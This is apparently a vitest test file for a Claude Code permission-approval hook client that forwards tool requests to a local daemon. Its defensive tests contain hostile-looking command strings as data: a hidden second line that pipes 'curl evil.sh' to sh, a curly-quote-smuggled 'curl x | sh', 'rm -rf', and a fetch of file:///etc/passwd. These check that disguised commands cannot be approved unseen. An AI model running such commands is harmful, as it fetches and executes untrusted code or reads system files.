/**
 * The approval hook's client: what leaves the hook is four typed fields, and anything it cannot read or hear back is
 * no decision, so the terminal's own prompt decides. Every daemon here is a listener on a throwaway socket or port.
 */
import { existsSync, mkdirSync, mkdtempSync, rmSync } from 'node:fs'
import { createServer, type IncomingHttpHeaders, type ServerResponse } from 'node:http'
import type { AddressInfo } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { hookTokenPath } from '../lib/hookAuth.js'
import { unixSocketPath } from '../lib/localSocket.js'
import { approvalSummary, daemonPost, runApprove } from './approve.js'

type Body = { sessionId: string; tool: string; summary: string; cwd?: string; terminalOnly?: true }
type Decision = 'allow' | 'deny' | 'none'

const ALLOW = '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
const DENY = '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Denied from the Harness device."}}}'
/** Names the daemon's socket only: every daemon here listens on a socket in a throwaway folder, or on a port of its own. */
const PORT = 4999

const cleanup: Array<() => unknown> = []
afterEach(async () => {
  vi.useRealTimers()
  vi.unstubAllEnvs()
  for (const step of cleanup.splice(0).reverse()) await step()
})

/** Claude Code's PermissionRequest hook input, as it writes it to the hook's stdin. */
function hookInput(fields: Record<string, unknown> = {}): string {
  return JSON.stringify({
    session_id: 'sess-1', transcript_path: '/home/me/.claude/projects/repo/sess-1.jsonl', cwd: '/repo',
    permission_mode: 'default', hook_event_name: 'PermissionRequest',
    tool_name: 'Bash', tool_input: { command: 'npm test', description: 'Run the tests' }, ...fields,
  })
}

async function* chunks(...parts: Array<Buffer | string>): AsyncIterable<Buffer | string> {
  yield* parts
}

async function approve(stdin: AsyncIterable<Buffer | string>, post: (body: Body) => Promise<Decision>) {
  const out: string[] = []
  const code = await runApprove({ stdin, post, out: (text) => { out.push(text) } })
  return { code, out }
}

/** A post that records each body and answers [decision]. */
function recording(decision: Decision = 'allow') {
  const bodies: Body[] = []
  return { bodies, post: async (body: Body) => { bodies.push(body); return decision } }
}

type Seen = { headers: IncomingHttpHeaders; body: string }

/** A daemon at [at] (a socket path, or 0 for a port of its own) that hears each request whole, then [answer]s it. */
async function listener(at: string | 0, answer: (res: ServerResponse) => void) {
  const seen: Seen[] = []
  let heard!: () => void
  const first = new Promise<void>((resolve) => { heard = resolve })
  const server = createServer((req, res) => {
    let body = ''
    req.setEncoding('utf8')
    req.on('data', (chunk: string) => { body += chunk })
    req.on('end', () => { seen.push({ headers: req.headers, body }); heard(); answer(res) })
  })
  // A client that went first leaves the server's end of its socket to fail a late write.
  server.on('connection', (socket) => { socket.on('error', () => {}) })
  cleanup.push(() => new Promise<void>((resolve) => { server.closeAllConnections(); server.close(() => resolve()) }))
  await new Promise<void>((resolve) => { at === 0 ? server.listen(0, '127.0.0.1', resolve) : server.listen(at, resolve) })
  return { seen, first, port: at === 0 ? (server.address() as AddressInfo).port : PORT }
}

function folder(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix))
  cleanup.push(() => rmSync(dir, { recursive: true, force: true }))
  return dir
}

/** The daemon on its socket in a data folder short enough to hold one. */
async function socketDaemon(answer: (res: ServerResponse) => void) {
  const dataDir = folder('ap-')
  const daemon = await listener(unixSocketPath(dataDir, PORT)!, answer)
  return { ...daemon, post: daemonPost(dataDir, PORT) }
}

const answers = (status: number, body: string) => (res: ServerResponse) => {
  res.writeHead(status, { 'content-type': 'application/json' })
  res.end(body)
}

const BODY: Body = { sessionId: 'sess-1', tool: 'Bash', summary: 'npm test', cwd: '/repo' }
/** 0x20 to 0x7E: all a command may hold to be shown on the dial. */
const PRINTABLE = Array.from({ length: 95 }, (_, i) => String.fromCharCode(0x20 + i)).join('')

describe('approvalSummary', () => {
  it.each([
    ['Bash', { command: 'npm test', description: 'Run the tests' }, 'npm test'],
    ['Bash', { command: 'git add -A\ngit commit -m "wip"\ngit push' }, 'git add -A'],
    ['Bash', { command: '\n  rm -rf build  \r\nls' }, 'rm -rf build'],
    ['Edit', { file_path: '/repo/src/app.ts', old_string: 'a', new_string: 'b' }, '/repo/src/app.ts'],
    ['Write', { file_path: '/repo/notes.md', content: 'hello' }, '/repo/notes.md'],
    ['Read', { file_path: '/repo/README.md' }, '/repo/README.md'],
    ['NotebookEdit', { notebook_path: '/repo/analysis.ipynb', new_source: 'x = 1' }, '/repo/analysis.ipynb'],
    ['WebFetch', { url: 'https://docs.example.com/guide/start?lang=en&key=abc#top', prompt: 'Summarize' }, 'docs.example.com'],
    ['mcp__github__create_issue', { title: 'A bug' }, 'github: create_issue'],
    ['mcp__claude_ai_Claude_Docs__batch', {}, 'claude_ai_Claude_Docs: batch'],
    ['Glob', { pattern: '**/*.ts' }, 'Glob'],
    ['Bash', {}, 'Bash'],
    ['Bash', { command: ' \n ' }, 'Bash'],
    ['Edit', { file_path: 7 }, 'Edit'],
    ['WebFetch', { url: 'not a url' }, 'WebFetch'],
    ['Read', null, 'Read'],
    ['Read', 'a string', 'Read'],
  ])('the summary per tool: %s %j is %j', (tool, input, summary) => {
    expect(approvalSummary(tool, input)).toBe(summary)
  })

  it('cuts 300 bytes of multi-byte text to at most 200 on a character', () => {
    expect(approvalSummary('Bash', { command: '日'.repeat(100) })).toBe('日'.repeat(66))
    // 2 + 49 × 4 = 198: the 50th emoji would make 202.
    const emoji = approvalSummary('Read', { file_path: `ab${'😀'.repeat(75)}` })
    expect(emoji).toBe(`ab${'😀'.repeat(49)}`)
    expect(Buffer.byteLength(emoji)).toBeLessThanOrEqual(200)
  })

  it('a tab or a newline in the summary becomes a space, as does every other control character', () => {
    expect(approvalSummary('Read', { file_path: '/repo/a\tb\nc\u0007d\u007fe\u0085f' })).toBe('/repo/a b c d e f')
  })
})

describe('runApprove', () => {
  it.each(['AskUserQuestion', 'ExitPlanMode'])('no decision and no post for %s', async (tool) => {
    const daemon = recording()
    expect(await approve(chunks(hookInput({ tool_name: tool, tool_input: {} })), daemon.post)).toEqual({ code: 0, out: [] })
    expect(daemon.bodies).toEqual([])
  })

  it('no decision and no post for 256 KB + 1 of stdin, and a post for 256 KB', async () => {
    const padded = (bytes: number) => {
      const text = hookInput({ pad: 'x'.repeat(bytes - Buffer.byteLength(hookInput({ pad: '' }))) })
      expect(Buffer.byteLength(text)).toBe(bytes)
      const half = Buffer.from(text)
      return chunks(half.subarray(0, 100_000), half.subarray(100_000))
    }
    const over = recording()
    expect(await approve(padded(256 * 1024 + 1), over.post)).toEqual({ code: 0, out: [] })
    expect(over.bodies).toEqual([])

    const whole = recording()
    expect(await approve(padded(256 * 1024), whole.post)).toEqual({ code: 0, out: [ALLOW] })
    expect(whole.bodies).toEqual([BODY])
  })

  it.each([
    ['stdin that is not JSON', 'not json'],
    ['empty stdin', ''],
    ['JSON that is not an object', '["Bash"]'],
    ['no session_id', hookInput({ session_id: undefined })],
    ['an empty session_id', hookInput({ session_id: '' })],
    ['no tool_name', hookInput({ tool_name: undefined })],
    ['a tool_name that is not a string', hookInput({ tool_name: 7 })],
  ])('no decision and no post for %s', async (_case, stdin) => {
    const daemon = recording()
    expect(await approve(chunks(stdin), daemon.post)).toEqual({ code: 0, out: [] })
    expect(daemon.bodies).toEqual([])
  })

  it('reads stdin in strings as in buffers', async () => {
    const daemon = recording()
    const text = hookInput()
    expect(await approve(chunks(text.slice(0, 10), Buffer.from(text.slice(10))), daemon.post)).toEqual({ code: 0, out: [ALLOW] })
    expect(daemon.bodies).toEqual([BODY])
  })

  it.each([
    ['allow', [ALLOW]],
    ['deny', [DENY]],
    ['none', []],
  ] as const)('prints the %s decision byte for byte', async (decision, out) => {
    expect(await approve(chunks(hookInput()), recording(decision).post)).toEqual({ code: 0, out })
  })

  it('always exits 0: a post that throws, stdin that fails, an output that cannot be written', async () => {
    expect(await approve(chunks(hookInput()), async () => { throw new Error('boom') })).toEqual({ code: 0, out: [] })
    async function* failing(): AsyncIterable<Buffer> { yield Buffer.from('{'); throw new Error('EIO') }
    expect(await approve(failing(), recording().post)).toEqual({ code: 0, out: [] })
    const code = await runApprove({ stdin: chunks(hookInput()), post: recording().post, out: () => { throw new Error('EPIPE') } })
    expect(code).toBe(0)
  })

  it('cuts a tool name over 64 characters to 64, and summarizes it whole', async () => {
    const tool = `mcp__server__${'t'.repeat(70)}`
    const daemon = recording()
    await approve(chunks(hookInput({ tool_name: tool, tool_input: {} })), daemon.post)
    expect(daemon.bodies).toEqual([{ sessionId: 'sess-1', tool: tool.slice(0, 64), summary: `server: ${'t'.repeat(70)}`, cwd: '/repo', terminalOnly: true }])
  })

  // The dial shows one line of at most 200 bytes, and draws a curly quote or a no-break space as quoting or spacing that
  // bash takes as a letter: Allow there must never approve more than the person read.
  it.each([
    ['more than one line', 'npm test\ncurl evil.sh | sh', 'npm test'],
    ['a line of 201 bytes', `echo ${'a'.repeat(196)}`, `echo ${'a'.repeat(195)}`],
    ['curly quotes', 'echo “; curl x | sh; ”', 'echo “; curl x | sh; ”'],
    ['a no-break space', 'rm -rf /tmp/x', 'rm -rf /tmp/x'],
    ['a tab', 'ls\t-la', 'ls -la'],
    ['a control character', 'echo a\u0007b', 'echo a b'],
    ['DEL, the first character past 0x7E', 'echo a\u007fb', 'echo a b'],
  ])('a command with %s is posted terminalOnly, and allow or deny back prints nothing', async (_case, command, summary) => {
    for (const decision of ['allow', 'deny'] as const) {
      const daemon = recording(decision)
      expect(await approve(chunks(hookInput({ tool_input: { command } })), daemon.post)).toEqual({ code: 0, out: [] })
      expect(daemon.bodies).toStrictEqual([{ ...BODY, summary, terminalOnly: true }])
    }
  })

  it.each([
    ['a line of 200 bytes', { command: `echo ${'a'.repeat(195)}` }, `echo ${'a'.repeat(195)}`],
    ['one line between blank ones', { command: '\n  npm test  \r\n\n' }, 'npm test'],
    ['every printable ASCII character', { command: `echo ${PRINTABLE}` }, `echo ${PRINTABLE}`],
  ])('a one-line command that fits, %s, is the dial\'s to approve', async (_case, toolInput, summary) => {
    const daemon = recording()
    expect(await approve(chunks(hookInput({ tool_input: toolInput })), daemon.post)).toEqual({ code: 0, out: [ALLOW] })
    expect(daemon.bodies).toStrictEqual([{ ...BODY, summary }])
  })

  it('the rest of tool_input is not posted, and a cwd that is missing or not a string is left out', async () => {
    const daemon = recording()
    const secret = 'API_KEY=sk-live-0123456789'
    await approve(chunks(hookInput({ tool_name: 'Write', tool_input: { file_path: '/repo/.env', content: secret } })), daemon.post)
    await approve(chunks(hookInput({ cwd: undefined })), daemon.post)
    await approve(chunks(hookInput({ cwd: 7 })), daemon.post)
    expect(daemon.bodies).toEqual([
      { sessionId: 'sess-1', tool: 'Write', summary: '/repo/.env', cwd: '/repo' },
      { sessionId: 'sess-1', tool: 'Bash', summary: 'npm test' },
      { sessionId: 'sess-1', tool: 'Bash', summary: 'npm test' },
    ])
    expect(JSON.stringify(daemon.bodies)).not.toContain('sk-live')
  })

  // The core refuses a cwd it cannot hold (core/deviceHookCalls.ts), and the card with it: the request goes without one.
  it.each([
    ['of 1025 characters', `/${'d'.repeat(1024)}`],
    ['with a newline', '/repo\n/other'],
    ['with a tab', '/repo\tx'],
  ])('a cwd %s is left out, and the request is still posted', async (_case, cwd) => {
    const daemon = recording()
    expect(await approve(chunks(hookInput({ cwd })), daemon.post)).toEqual({ code: 0, out: [ALLOW] })
    expect(daemon.bodies).toStrictEqual([{ sessionId: 'sess-1', tool: 'Bash', summary: 'npm test' }])
  })

  it('a cwd of 1024 characters is posted', async () => {
    const daemon = recording()
    const cwd = `/${'d'.repeat(1023)}`
    await approve(chunks(hookInput({ cwd })), daemon.post)
    expect(daemon.bodies).toStrictEqual([{ ...BODY, cwd }])
  })
})

describe('daemonPost', () => {
  it.each([
    ['allow', 200, '{"decision":"allow"}', 'allow'],
    ['deny', 200, '{"decision":"deny"}', 'deny'],
    ['none', 200, '{"decision":"none"}', 'none'],
    ['an unknown decision', 200, '{"decision":"maybe"}', 'none'],
    ['no decision', 200, '{}', 'none'],
    ['a body that is not JSON', 200, 'allow', 'none'],
    ['a 500', 500, '{"decision":"allow"}', 'none'],
    ['a 404', 404, '{"error":"NOT_FOUND"}', 'none'],
    ['a 401', 401, '{"error":"UNAUTHORIZED"}', 'none'],
  ] as const)('a daemon that answers %s is %s', async (_case, status, body, decision) => {
    const daemon = await socketDaemon(answers(status, body))
    expect(await daemon.post(BODY)).toBe(decision)
    expect(daemon.seen.map(({ body }) => JSON.parse(body))).toEqual([BODY])
  })

  it('a daemon that is not running is none', async () => {
    expect(await daemonPost(folder('ap-'), PORT)(BODY)).toBe('none')
  })

  it('a daemon that holds the call past 310 s is none, and not before', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    const daemon = await socketDaemon(() => {})
    let settled = false
    const decision = daemon.post(BODY).then((value) => { settled = true; return value })
    await daemon.first
    vi.advanceTimersByTime(309_999)
    await new Promise((resolve) => setImmediate(resolve))
    expect(settled).toBe(false)
    vi.advanceTimersByTime(1)
    expect(await decision).toBe('none')
  })

  it.each([
    ['npm test\ncurl evil.sh | sh', 'npm test'],
    ['echo “; curl x | sh; ”', 'echo “; curl x | sh; ”'],
    ['rm -rf /tmp/x', 'rm -rf /tmp/x'],
  ])('%j is posted terminalOnly, and the daemon\'s allow prints nothing', async (command, summary) => {
    const daemon = await socketDaemon(answers(200, '{"decision":"allow"}'))
    expect(await approve(chunks(hookInput({ tool_input: { command } })), daemon.post)).toEqual({ code: 0, out: [] })
    expect(daemon.seen.map(({ body }) => JSON.parse(body))).toStrictEqual([{ ...BODY, summary, terminalOnly: true }])
  })

  // Allow on the dial approves what its card shows and nothing more. A card that could show only a tool's name, or a
  // path or host it cannot show whole in plain ASCII, leaves the answer to the terminal.
  it.each([
    ['an MCP tool', 'mcp__github__create_issue', { title: 'A bug', body: 'Steps' }, 'github: create_issue'],
    ['a tool the dial does not show', 'Task', { description: 'Explore', prompt: 'Find the bug' }, 'Task'],
    ['a tool newer than this client', 'SomeNewTool', { anything: 'x' }, 'SomeNewTool'],
    ['a Write to a path past ASCII', 'Write', { file_path: '/tmp/café.txt', content: 'x' }, '/tmp/café.txt'],
    ['an Edit of a path with a newline', 'Edit', { file_path: '/repo/a.ts\n/etc/hosts', old_string: 'a', new_string: 'b' }, '/repo/a.ts /etc/hosts'],
    ['a Read of a path of 201 bytes', 'Read', { file_path: `/repo/${'a'.repeat(195)}` }, `/repo/${'a'.repeat(194)}`],
    ['a NotebookEdit of a path past ASCII', 'NotebookEdit', { notebook_path: '/repo/日本.ipynb', new_source: 'x' }, '/repo/日本.ipynb'],
    ['a WebFetch of a host in other letters', 'WebFetch', { url: 'https://café.example/menu', prompt: 'x' }, 'xn--caf-dma.example'],
    ['a WebFetch of a URL with no host', 'WebFetch', { url: 'file:///etc/passwd', prompt: 'x' }, 'WebFetch'],
    ['a blank Bash command', 'Bash', { command: ' \n ' }, 'Bash'],
  ])('%s is posted terminalOnly, and the daemon\'s allow prints nothing', async (_case, tool, toolInput, summary) => {
    const daemon = await socketDaemon(answers(200, '{"decision":"allow"}'))
    expect(await approve(chunks(hookInput({ tool_name: tool, tool_input: toolInput })), daemon.post)).toEqual({ code: 0, out: [] })
    expect(daemon.seen.map(({ body }) => JSON.parse(body))).toStrictEqual([{ ...BODY, tool, summary, terminalOnly: true }])
  })

  it.each([
    ['Edit', { file_path: '/repo/src/app.ts', old_string: 'a', new_string: 'b' }, '/repo/src/app.ts'],
    ['Write', { file_path: '/repo/notes.md', content: 'café' }, '/repo/notes.md'],
    ['Read', { file_path: `/repo/${'a'.repeat(194)}` }, `/repo/${'a'.repeat(194)}`],
    ['NotebookEdit', { notebook_path: '/repo/analysis.ipynb', new_source: 'x = 1' }, '/repo/analysis.ipynb'],
    ['WebFetch', { url: 'https://docs.example.com/guide/café?lang=en', prompt: 'Summarize' }, 'docs.example.com'],
  ])('%s of %j, shown whole, is the dial\'s: posted plain, and the daemon\'s allow prints', async (tool, toolInput, summary) => {
    const daemon = await socketDaemon(answers(200, '{"decision":"allow"}'))
    expect(await approve(chunks(hookInput({ tool_name: tool, tool_input: toolInput })), daemon.post)).toEqual({ code: 0, out: [ALLOW] })
    expect(daemon.seen.map(({ body }) => JSON.parse(body))).toStrictEqual([{ ...BODY, tool, summary }])
  })

  it('a connection that closes mid-wait prints nothing and exits 0', async () => {
    const daemon = await socketDaemon((res) => { res.socket?.destroy() })
    expect(await approve(chunks(hookInput()), daemon.post)).toEqual({ code: 0, out: [] })
    expect(daemon.seen).toHaveLength(1)
  })

  it('the posted body never carries ORCA_PAIRING_CODE, ORCA_AGENT_SESSION_SPAWN_TOKEN or any other environment variable', async () => {
    vi.stubEnv('ORCA_PAIRING_CODE', 'pairing-4f1e9c')
    vi.stubEnv('ORCA_AGENT_SESSION_SPAWN_TOKEN', 'spawn-8b2d7a')
    vi.stubEnv('ORCA_TERMINAL_HANDLE', 'term_0b7e4a2c-1d3f-4e5a-8b9c-0d1e2f3a4b5c')
    vi.stubEnv('HARNESS_APPROVE_MARKER', 'marker-3c6a5e')
    const daemon = await socketDaemon(answers(200, '{"decision":"allow"}'))
    expect(await approve(chunks(hookInput()), daemon.post)).toEqual({ code: 0, out: [ALLOW] })
    expect(daemon.seen).toHaveLength(1)
    expect(JSON.parse(daemon.seen[0].body)).toEqual(BODY)
    for (const value of ['pairing-4f1e9c', 'spawn-8b2d7a', 'term_0b7e4a2c', 'marker-3c6a5e']) {
      expect(JSON.stringify(daemon.seen[0])).not.toContain(value)
    }
  })

  // Over the port nothing proves the answer is the daemon's: an account holding it while the daemon restarts could
  // answer allow (audit H1). A data folder and a home too long for a socket leave only the port, so nothing is sent.
  it('posts nothing, creates no hook token and prints nothing where there is no socket', async () => {
    const dir = folder('ap-')
    const dataDir = join(dir, 'd'.repeat(100))
    mkdirSync(dataDir, { mode: 0o700 })
    vi.stubEnv('HOME', join(dir, 'h'.repeat(100)))
    const overPort = await listener(0, answers(200, '{"decision":"allow"}'))
    expect(unixSocketPath(dataDir, overPort.port)).toBeNull()
    expect(await approve(chunks(hookInput()), daemonPost(dataDir, overPort.port))).toEqual({ code: 0, out: [] })
    expect(overPort.seen).toEqual([])
    expect(existsSync(hookTokenPath(dataDir))).toBe(false)
  })
})
